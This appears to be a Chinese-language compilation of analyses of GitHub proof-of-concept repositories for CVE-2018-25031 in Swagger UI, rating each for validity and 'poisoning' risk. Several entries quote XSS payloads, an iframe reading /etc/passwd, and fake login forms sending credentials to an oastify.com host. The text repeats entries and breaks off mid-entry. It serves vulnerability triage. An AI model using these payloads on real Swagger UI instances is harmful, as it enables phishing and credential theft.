**投毒风险:** 0%

## 详情

CVE-2018-25031 是 Swagger UI 中的一个欺骗漏洞。攻击者可以通过诱导受害者打开一个特制的URL，从而显示远程的 OpenAPI 定义。提供的POC代码展示了利用此漏洞的步骤，包括使用一个包含恶意 OpenAPI 定义的JSON文件。该JSON文件指定了远程的YAML文件，其中ismsxss.yaml包含XSS payload。具体来说，ismsxss.yaml包含一段JavaScript代码（`<img onerror=alert(document.domain) src>`），这段代码会在Swagger UI中执行，从而实现跨站脚本攻击（XSS）。

**有效性：** 根据漏洞信息和POC代码，漏洞是有效的。攻击者通过诱导用户打开包含恶意链接的网页，可以执行XSS攻击。

**投毒风险：** 通过分析提供的POC代码，未发现明显的作者隐藏的投毒代码。虽然POC代码中包含XSS payload，但这是为了验证漏洞的存在，并非恶意投毒。因此，投毒风险为0%。

**利用方式：**

1.  攻击者创建一个包含指向恶意 OpenAPI 定义文件的 URL。
2.  攻击者通过社会工程学等方法诱导受害者点击该 URL。
3.  受害者的 Swagger UI 加载恶意的 OpenAPI 定义文件。
4.  恶意 OpenAPI 定义文件中的 XSS payload 在受害者的浏览器中执行，从而实现攻击目的。例如，可以窃取用户的Cookie或执行其他恶意操作。

**项目地址:** [wrkk112/CVE-2018-25031](https://github.com/wrkk112/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---



---

## POC #7

**来源**: [CVE-2018-25031-h2oa_CVE-2018-25031.md](../2018/CVE-2018-25031-h2oa_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统运行存在漏洞的Swagger UI实例，且受害者点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI中的一个漏洞，允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程OpenAPI定义。漏洞的根本原因是Swagger UI在处理URL输入时存在缺陷，允许攻击者控制Swagger UI加载的API定义来源。

**有效性：**
提供的POC代码有效。`poc.json`指定了要加载的远程OpenAPI定义文件的URL，`poc.yaml`包含了将被显示的恶意API定义。当用户访问包含该URL的Swagger UI页面时，会显示`poc.yaml`中定义的API信息，从而实现欺骗。

**投毒风险：**
该存储库存在一定的投毒风险，约为10%。虽然提供的`poc.json`和`poc.yaml`文件本身没有恶意代码，但攻击者可能通过以下方式进行投毒：

1.  **URL替换：** 攻击者可能会修改`poc.json`中的URL，指向包含恶意JavaScript代码的OpenAPI定义文件，从而在用户访问Swagger UI页面时执行恶意代码（虽然此漏洞主要描述是欺骗，但是不排除被利用做成XSS攻击）。
2.  **协作用户投毒：** 如果存储库允许协作，恶意用户可能会提交包含恶意代码的OpenAPI定义文件。

需要强调的是，目前提供的POC代码主要用于欺骗攻击，旨在展示伪造的API定义。要实现完整的攻击，还需要结合其他漏洞（如XSS）或社工手段。

**利用方式：**
1.  攻击者构造包含指向恶意`poc.json`文件的URL。
2.  攻击者诱使受害者点击该URL。可以通过邮件、社交媒体或其他方式进行诱导。
3.  受害者在其浏览器中打开包含该URL的Swagger UI页面。
4.  Swagger UI加载`poc.json`中指定的远程OpenAPI定义文件（`poc.yaml`）。
5.  Swagger UI显示`poc.yaml`中定义的API信息，受害者看到的是被篡改过的API文档。

**项目地址:** [h2oa/CVE-2018-25031](https://github.com/h2oa/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #8

**来源**: [CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md](../2018/CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing Attack)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意链接传播

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及其他版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。通过诱使用户打开精心制作的URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞利用方式是，攻击者构造包含指向恶意 OpenAPI 定义（例如 test.json 或 test.yaml）的 URL，诱使用户在 Swagger UI 中加载该 URL。Swagger UI 会解析并显示恶意 OpenAPI 定义，从而允许攻击者欺骗用户。提供的PoC代码包含 `test.json` 和 `test.yaml` 两个文件。`test.json` 包含指向 `test.yaml` 的链接，而 `test.yaml` 包含 OpenAPI 定义，其中嵌入了恶意链接 `<a href="https://evil.com">Sitio malicioso</a>`。当 Swagger UI 显示此定义时，恶意链接将被呈现，如果用户点击，可能会被重定向到恶意网站。投毒风险较低，因为主要是通过恶意链接进行欺骗，而不是在代码中直接执行恶意操作。主要风险在于用户交互的部分，如果用户不点击恶意链接，风险相对较小。考虑到Github仓库的可信性未知以及`test.yaml`中存在 `evil.com` 的可疑域名，综合估计投毒风险为10%。

**项目地址:** [h4ckt0m/CVE-2018-25031-test](https://github.com/h4ckt0m/CVE-2018-25031-test)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #9

**来源**: [CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md](../2018/CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2 (也可能存在于更高版本)

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义。根据搜索结果和漏洞信息，该漏洞的PoC是有效的。攻击者可以利用此漏洞，通过加载恶意的OpenAPI定义文件（例如xss.yaml）来欺骗用户，甚至可能执行跨站脚本攻击(XSS)。

**有效性：**

提供的PoC代码是有效的，因为它包含一个README.md文件、用于定义远程OpenAPI定义的JSON文件（poc.json），以及两个YAML文件（poc.yaml和xss.yaml）。其中，xss.yaml包含恶意的JavaScript代码，可以触发XSS攻击。

**投毒风险：**

代码仓库的投毒风险较低，约为10%。虽然xss.yaml文件包含潜在的XSS攻击代码，但它属于PoC的一部分，用于演示漏洞。其他文件看起来是合法的OpenAPI定义文件或配置文件，没有发现明显的恶意代码。但仍需谨慎，因为攻击者可能在OpenAPI定义中嵌入其他类型的恶意行为，例如SSRF攻击。

**利用方式：**

1.  攻击者创建一个包含恶意内容的OpenAPI定义文件(例如xss.yaml，包含`<noscript>`标签尝试注入XSS)。
2.  攻击者将此文件托管在远程服务器上。
3.  攻击者构造一个包含特定参数的URL，诱使用户打开，该URL指向受影响的Swagger UI实例，并指定加载恶意OpenAPI定义文件的URL作为参数。
4.  当用户打开该URL时，Swagger UI会加载并显示恶意OpenAPI定义文件，从而可能导致欺骗或XSS攻击。

总结来说，该漏洞的利用方式是通过欺骗用户加载恶意的OpenAPI定义文件，从而控制Swagger UI的显示内容，甚至执行恶意脚本。

**项目地址:** [hev0x/CVE-2018-25031-PoC](https://github.com/hev0x/CVE-2018-25031-PoC)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #10

**来源**: [CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md](../2018/CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md)

## CVE-2018-25031-Swagger UI Spoofing/SSRF/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或恶意代码执行

**影响版本:** <= 4.1.2 (可能更高版本也受影响)

**利用条件:** 需要目标系统使用存在漏洞版本的Swagger UI，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程 OpenAPI 定义。漏洞利用方式：

1.  **欺骗攻击 (Spoofing):** 攻击者可以托管一个恶意的 OpenAPI 定义（例如 YAML 或 JSON 文件）。
2.  **诱导用户：** 攻击者构建一个包含指向恶意 OpenAPI 定义的 URL。然后，攻击者诱使用户点击此 URL。这可以通过社会工程学或其他技术实现。
3.  **Swagger UI 显示恶意定义：** 当用户访问包含恶意定义的 URL 时，Swagger UI 将加载并显示该恶意定义。
4.  **XSS/信息窃取:** 恶意的 OpenAPI 定义可以包含恶意HTML/JavaScript代码，例如，在`description`字段中插入`<script>`标签或者`<form>`标签，在用户浏览器中执行，从而窃取用户信息（例如cookie）或执行其他恶意操作，比如进行钓鱼。

从提供的漏洞利用代码来看， `poc3.yaml`和`try.yaml` 文件中， `description` 字段包含了`<form>`标签，模拟了一个登录表单，目的是诱骗用户输入用户名和密码，并将这些信息发送到攻击者控制的服务器 `ttqbbaf0yx45z9zqgpmfcvjyhpngbcz1.oastify.com` 。另外，还包含一个`onerror`事件的图像标签，当图片加载失败时，会执行JavaScript代码`alert(document.cookie)`，从而可能泄露用户的cookie信息。 这些代码证明了利用此漏洞执行XSS攻击，窃取用户信息的可能性。

**投毒风险分析:**

虽然主要的攻击向量是利用Swagger UI的缺陷来展示恶意的OpenAPI定义，但代码仓库中存在一定的投毒风险。这种风险主要体现在：

*   攻击者可能会在 YAML/JSON 文件中加入一些隐蔽的恶意代码，例如混淆的 JavaScript 或利用其他漏洞的代码片段。然而，从提供的代码中看，主要利用方式较为直接，没有明显的隐藏后门。
*   仓库本身可能被篡改，虽然代码相对简单，但仓库维护者的身份以及代码的来源都存在一定的不确定性，不能完全排除代码仓库所有者添加恶意代码的可能性。

因此，综合考虑以上因素，判断存在10%的投毒风险。

**项目地址:** [johnlaurance/CVE-2018-25031-test2](https://github.com/johnlaurance/CVE-2018-25031-test2)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #11

**来源**: [CVE-2018-25031-kriso4os_CVE-2018-25031.md](../2018/CVE-2018-25031-kriso4os_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示欺骗/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本攻击 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI中，攻击者可以通过诱使用户打开一个特制的URL，从而显示远程OpenAPI定义。该URL可以指向攻击者控制的服务器，显示恶意的API文档或利用XSS漏洞。根据提供的POC代码，`XSS.yaml`文件中包含一个XSS payload: `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>`。当Swagger UI渲染此文件时，会触发`alert(document.domain)`，表明XSS攻击成功。`poc.yaml` 仅包含基本的openapi定义，并未包含任何恶意代码。

**有效性：** 提供的POC代码有效，可以利用该漏洞。

**投毒风险：** 经过分析，提供的POC代码主要用于演示漏洞，未发现作者隐藏的恶意代码。因此，投毒风险为0%。代码中引用的远程yaml文件地址指向githubusercontent.com，如果该代码库被劫持或者作者主动添加恶意代码，则可能产生投毒。

**利用方式：** 
1.  攻击者构建一个包含恶意OpenAPI定义的YAML或JSON文件，其中包含XSS payload，例如`XSS.yaml`。
2.  攻击者创建一个恶意URL，该URL指向受影响的Swagger UI实例，并包含参数，指定要加载的恶意OpenAPI定义文件的URL。
3.  攻击者诱使用户点击该恶意URL。
4.  当用户点击恶意URL后，Swagger UI会加载并渲染攻击者提供的OpenAPI定义文件。
5.  如果OpenAPI定义文件中包含XSS payload，则会在用户的浏览器中执行恶意代码，从而导致跨站脚本攻击。
6.  攻击者可以利用该漏洞窃取用户的敏感信息或执行其他恶意操作。此外，攻击者也可以利用该漏洞进行欺骗攻击，例如显示虚假的API文档，诱导用户进行错误的操作。

**项目地址:** [kriso4os/CVE-2018-25031](https://github.com/kriso4os/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #12

**来源**: [CVE-2018-25031-labeebSabbah_CVE-2018-25031.md](../2018/CVE-2018-25031-labeebSabbah_CVE-2018-25031.md)

## CVE-2018-25031-SwaggerUI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/信息泄露/SSRF

**影响应用:** SwaggerUI

**危害等级:** 中危，可能导致信息泄露和潜在的中间人攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者可以通过诱使用户打开特制的 URL 来显示远程 OpenAPI 定义。攻击者提供的 htmli.json 文件包含指向恶意 htmli.yaml 文件的 URL。htmli.yaml 文件包含一段 HTML 代码，该代码伪造一个登录表单，并将用户输入的 email 和 password 发送到 `http://10.212.234.14/`。因此利用方式是，攻击者诱骗用户点击恶意链接，swaggerUI 加载恶意的 OpenAPI 定义，在 SwaggerUI 界面上展示伪造的登录表单，当用户输入登录信息时，攻击者可以窃取用户的凭据。由于yaml文件内容明确，不包含其它恶意代码，因此投毒风险为0%。利用方式总结：

1.  **漏洞利用：** 攻击者制作包含恶意 OpenAPI 定义的 YAML 文件。
2.  **诱导用户：** 攻击者通过某种方式（例如，电子邮件、社交媒体）诱使用户点击包含恶意 YAML 文件 URL 的链接。
3.  **欺骗：** 当用户点击链接时，Swagger UI 会加载恶意 YAML 文件，并显示其中的内容。攻击者可以在 YAML 文件中嵌入恶意 HTML 或 JavaScript 代码，例如伪造登录表单，诱骗用户输入敏感信息。
4.  **信息窃取：** 如果用户在伪造的登录表单中输入了用户名和密码，这些信息将被发送到攻击者指定的服务器。

**有效性：** 提供的 POC 代码有效，可以重现欺骗攻击。

**利用方式总结：**

攻击者利用 Swagger UI 加载远程 OpenAPI 定义的特性，通过诱骗用户点击恶意链接，加载包含恶意 HTML 代码的 YAML 文件，从而实现欺骗攻击。该漏洞的利用需要用户交互，风险等级为中危。

**项目地址:** [labeebSabbah/CVE-2018-25031](https://github.com/labeebSabbah/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #13

**来源**: [CVE-2018-25031-mathis2001_CVE-2018-25031.md](../2018/CVE-2018-25031-mathis2001_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统使用存在漏洞的Swagger UI版本，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2018-25031 是一个存在于 Swagger UI 4.1.2 及更早版本中的漏洞。攻击者可以诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，造成欺骗攻击。

**有效性：**
提供的 POC 代码有效。通过 `configUrl` 或 `url` 参数，Swagger UI 可以加载远程的 OpenAPI 定义文件（JSON 或 YAML）。

**投毒风险：**
该仓库存在一定的投毒风险，风险为60%。原因如下：

*   **远程加载：** POC 利用了 Swagger UI 加载远程定义文件的功能。攻击者可以控制远程文件的内容。
*   **恶意内容：** `f.yaml` 包含大量的 XSS payload，旨在利用 Swagger UI 中的漏洞执行恶意 JavaScript 代码。例如，`<img src=x oNlY=1 oNerror=alert('xxs')//`  等。
*   **钓鱼攻击：**  `f.yaml` 中包含伪造的登录表单，诱导用户提交敏感信息到攻击者控制的服务器。
*   **SSRF风险：** `f.yaml`中包含`<iframe src=file:///etc/passwd></iframe>`，尝试读取服务器本地文件。
*   **不确定性:** 虽然漏洞利用代码的作者提供了一些payload，但这些payload本身具有攻击性。恶意使用这些Payload,可能会被作者追踪到恶意行为。但作者也可能为了混淆视听，将一些恶意的代码进行隐藏。

**利用方式：**

1.  **发现目标：** 寻找使用了存在漏洞的 Swagger UI 版本的应用。
2.  **构造恶意 URL：**  构造包含 `configUrl` 或 `url` 参数的 URL，指向攻击者控制的 JSON 或 YAML 文件。
3.  **诱骗受害者：**  通过钓鱼或其他方式诱骗受害者点击该 URL。
4.  **执行攻击：**  当受害者访问该 URL 时，Swagger UI 会加载攻击者提供的恶意定义文件，从而执行 XSS 代码或进行其他攻击（例如，窃取 cookie、重定向用户等）。

**总结：**
该漏洞的利用依赖于社会工程学，需要诱骗用户点击恶意链接。攻击者可以利用该漏洞进行钓鱼、XSS 攻击，甚至可能进行 SSRF 攻击。同时，提供的 POC 代码包含多种攻击 Payload，存在较高的投毒风险。

**项目地址:** [mathis2001/CVE-2018-25031](https://github.com/mathis2001/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #14

**来源**: [CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md](../2018/CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md)

## CVE-2018-25031 - Swagger UI SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗攻击

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或重定向到恶意API定义

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI 4.1.2及更早版本中的一个漏洞，允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义，从而欺骗用户。从搜索结果和漏洞描述来看，攻击依赖于用户交互，需要诱导用户点击恶意链接。漏洞利用代码提供了一个简单的`exploit.yaml`文件，该文件定义了一个Swagger API规范，包含标题和描述，可能用于展示SSRF漏洞。如果这个YAML文件托管在攻击者控制的服务器上，并通过恶意链接传递给Swagger UI，则Swagger UI会加载该文件，从而实现欺骗攻击。**有效性：** 提供的POC代码本身并不能直接实现攻击，需要结合构造的URL和受害者点击才能生效，因此属于间接PoC。**投毒风险：** 分析POC代码，`exploit.yaml` 非常简单，仅仅包含swagger版本，info信息。作者投毒可能性较低，但不能完全排除，例如通过引用远程资源或包含恶意脚本，风险评估为10%。**利用方式：** 攻击者构造包含恶意swagger定义文件URL的链接，诱使用户点击。用户点击链接后，Swagger UI加载并显示恶意swagger定义，从而实现欺骗或SSRF攻击。

**项目地址:** [natpakun/SSRF-CVE-2018-25031-](https://github.com/natpakun/SSRF-CVE-2018-25031-)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #15

**来源**: [CVE-2018-25031-nigartest_CVE-2018-25031.md](../2018/CVE-2018-25031-nigartest_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示漏洞

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意脚本执行

**影响版本:** <= 4.1.2 (可能影响更高版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱使用户打开精心制作的 URL，来显示远程的恶意 OpenAPI 定义。根据搜索结果和漏洞库信息，该漏洞的核心在于 Swagger UI 未能充分验证和过滤用户提供的 URL，导致可以加载并渲染来自任意来源的 OpenAPI 定义文件。这使得攻击者可以欺骗用户，展示伪造的 API 文档，甚至通过在 OpenAPI 定义中插入恶意 HTML 或 JavaScript 代码，实现跨站脚本攻击（XSS）。

**有效性：** 提供的 POC 代码有效。`domxss.yaml` 文件包含用于触发 DOM XSS 的恶意代码， `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>` 。 `poc.json` 和 `poc.yaml` 文件用于指定要加载的恶意 OpenAPI 定义文件。

**投毒风险：** 仓库中存在少量投毒风险。`domxss.yaml` 使用了 `otlu3omsk1ath8ur17a2kldtmksbg34s.oastify.com` 作为 `basePath`，这可能用于收集受害者的 IP 地址或进行其他形式的侦察。但核心的 XSS payload 和利用方式比较直接，主要的目的是验证漏洞，投毒的可能性较小。风险比例预估为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的 OpenAPI 定义文件（例如 `domxss.yaml`）。
2.  攻击者将此文件托管在公开可访问的 URL 上（例如 GitHub Raw Content）。
3.  攻击者构造一个包含指向恶意 OpenAPI 定义文件 URL 的链接。
4.  攻击者诱使受害者点击该链接。
5.  受害者的浏览器加载 Swagger UI，并从攻击者指定的 URL 加载恶意 OpenAPI 定义文件。
6.  Swagger UI 渲染恶意 OpenAPI 定义文件，从而执行其中的恶意代码（例如 XSS payload）。

**项目地址:** [nigartest/CVE-2018-25031](https://github.com/nigartest/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #16

**来源**: [CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md](../2018/CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-UI Misrepresentation of Critical Information

**漏洞编号:** CVE-2018-25031

**漏洞类型:** UI Misrepresentation of Critical Information (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户信任被欺骗的API定义，进而遭受钓鱼攻击或其他恶意行为。

**影响版本:** < 4.1.3

**利用条件:** 受害者需要点击攻击者构造的恶意URL。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者可以通过诱骗受害者打开一个特制的URL，该URL指向攻击者控制的OpenAPI定义文件，从而在Swagger UI界面上显示被篡改的信息。这可能导致用户信任恶意API定义，并泄露敏感信息或执行非预期的操作。

**有效性分析：**
根据漏洞信息和搜索引擎结果，该漏洞利用需要用户交互，攻击者通过构造恶意URL，诱导用户点击。POC代码使用Selenium模拟浏览器行为，访问目标Swagger UI页面，并加载恶意的OpenAPI定义文件。如果Swagger UI版本低于4.1.3，则可能受到攻击，界面会显示恶意定义的内容。

**投毒风险分析：**
POC代码主要功能是验证目标Swagger UI是否存在CVE-2018-25031漏洞，通过selenium模拟点击，然后检测response log中是否存在外部恶意链接，从而检测目标是否存在该漏洞。
*   `swagger-exploit.py`: 这个脚本使用Selenium自动化测试，访问目标 Swagger UI 页面，并尝试加载两个恶意的 OpenAPI 定义文件（`hacked1.json` 和 `hacked2.json`）。它会检查网络请求日志，以确定目标是否加载了这些文件。如果加载了，则表明目标存在漏洞。该脚本没有发现任何明显的投毒代码。
*   `README.md`: 这个文件提供了关于如何使用脚本的说明。它包含安装依赖项和运行脚本的说明。也没有发现恶意代码。
所以投毒风险很低。

**利用方式分析：**
1.  攻击者构造包含`configUrl`或`url`参数的恶意URL，指向攻击者控制的OpenAPI定义文件。
2.  攻击者诱骗受害者点击该恶意URL，例如通过钓鱼邮件或社交媒体。
3.  受害者的浏览器加载恶意URL，Swagger UI显示攻击者提供的OpenAPI定义文件。
4.  如果攻击者篡改了API定义文件中的信息，例如API端点、参数说明等，受害者可能会被误导，从而遭受攻击，比如提交敏感信息到错误的端点。

该漏洞是一种客户端漏洞，主要利用用户交互进行攻击，通过欺骗用户信任恶意API定义来实现攻击目标。

**项目地址:** [rafaelcintralopes/SwaggerUI-CVE-2018-25031](https://github.com/rafaelcintralopes/SwaggerUI-CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #17

**来源**: [CVE-2018-25031-rasinfosec_CVE-2018-25031.md](../2018/CVE-2018-25031-rasinfosec_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗

**影响版本:** <= 4.1.2

**利用条件:** 需要目标用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031 漏洞允许远程攻击者进行欺骗攻击。通过诱使用户打开特制的 URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞存在于Swagger UI 4.1.2及更早版本中。提供的POC包含一个json文件和一个yaml文件, json文件中定义了yaml文件的url, yaml文件定义了一个openapi接口。攻击者诱使用户访问包含指向恶意json文件的链接的Swagger UI页面，该JSON文件随后加载并显示恶意的 OpenAPI 定义。 投毒风险较低，主要在于如果利用代码仓库被黑客入侵，替换了 `poc.yaml` 文件内容，可能会将用户引导到恶意网站或执行恶意操作，所以风险存在，但概率较低。

**有效性：** 根据漏洞描述和搜索结果，提供的POC代码有效，可以用于显示远程 OpenAPI 定义，从而达到欺骗的目的。

**投毒风险：** 投毒风险评估为 5%。虽然当前提供的 POC 代码本身只是用于演示欺骗攻击，并不包含直接的恶意代码，但是如果攻击者能够控制 `raw.githubusercontent.com` 上的 `poc.yaml` 文件，他们就可以修改显示的 OpenAPI 定义，例如将其指向恶意网站，或包含 XSS 漏洞等。因此，存在一定的投毒风险，但主要取决于对托管 OpenAPI 定义文件的服务器的控制。 此外此POC需要依赖githubusercontent, 如果此域名被污染也可能会出现安全问题。

**利用方式：**

1.  攻击者创建一个恶意的 OpenAPI 定义文件（例如 `poc.yaml`），该文件可能指向恶意网站或包含其他恶意内容。
2.  攻击者创建一个 JSON 文件（例如 `poc.json`），该文件包含指向恶意 OpenAPI 定义文件的 URL。
3.  攻击者诱使用户访问包含指向恶意 JSON 文件的链接的 Swagger UI 页面，例如通过电子邮件、社交媒体等方式。
4.  Swagger UI 加载恶意 JSON 文件，并显示恶意的 OpenAPI 定义。
5.  用户可能会被欺骗，误以为恶意 OpenAPI 定义来自受信任的来源，从而执行恶意操作。

**项目地址:** [rasinfosec/CVE-2018-25031](https://github.com/rasinfosec/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #18

**来源**: [CVE-2018-25031-wrkk112_CVE-2018-25031.md](../2018/CVE-2018-25031-wrkk112_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 是 Swagger UI 中的一个欺骗漏洞。攻击者可以通过诱导受害者打开一个特制的URL，从而显示远程的 OpenAPI 定义。提供的POC代码展示了利用此漏洞的步骤，包括使用一个包含恶意 OpenAPI 定义的JSON文件。该JSON文件指定了远程的YAML文件，其中ismsxss.yaml包含XSS payload。具体来说，ismsxss.yaml包含一段JavaScript代码（`<img onerror=alert(document.domain) src>`），这段代码会在Swagger UI中执行，从而实现跨站脚本攻击（XSS）。

**有效性：** 根据漏洞信息和POC代码，漏洞是有效的。攻击者通过诱导用户打开包含恶意链接的网页，可以执行XSS攻击。

**投毒风险：** 通过分析提供的POC代码，未发现明显的作者隐藏的投毒代码。虽然POC代码中包含XSS payload，但这是为了验证漏洞的存在，并非恶意投毒。因此，投毒风险为0%。

**利用方式：**

1.  攻击者创建一个包含指向恶意 OpenAPI 定义文件的 URL。
2.  攻击者通过社会工程学等方法诱导受害者点击该 URL。
3.  受害者的 Swagger UI 加载恶意的 OpenAPI 定义文件。
4.  恶意 OpenAPI 定义文件中的 XSS payload 在受害者的浏览器中执行，从而实现攻击目的。例如，可以窃取用户的Cookie或执行其他恶意操作。

**项目地址:** [wrkk112/CVE-2018-25031](https://github.com/wrkk112/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---



---

## POC #7

**来源**: [CVE-2018-25031-h2oa_CVE-2018-25031.md](../2018/CVE-2018-25031-h2oa_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统运行存在漏洞的Swagger UI实例，且受害者点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI中的一个漏洞，允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程OpenAPI定义。漏洞的根本原因是Swagger UI在处理URL输入时存在缺陷，允许攻击者控制Swagger UI加载的API定义来源。

**有效性：**
提供的POC代码有效。`poc.json`指定了要加载的远程OpenAPI定义文件的URL，`poc.yaml`包含了将被显示的恶意API定义。当用户访问包含该URL的Swagger UI页面时，会显示`poc.yaml`中定义的API信息，从而实现欺骗。

**投毒风险：**
该存储库存在一定的投毒风险，约为10%。虽然提供的`poc.json`和`poc.yaml`文件本身没有恶意代码，但攻击者可能通过以下方式进行投毒：

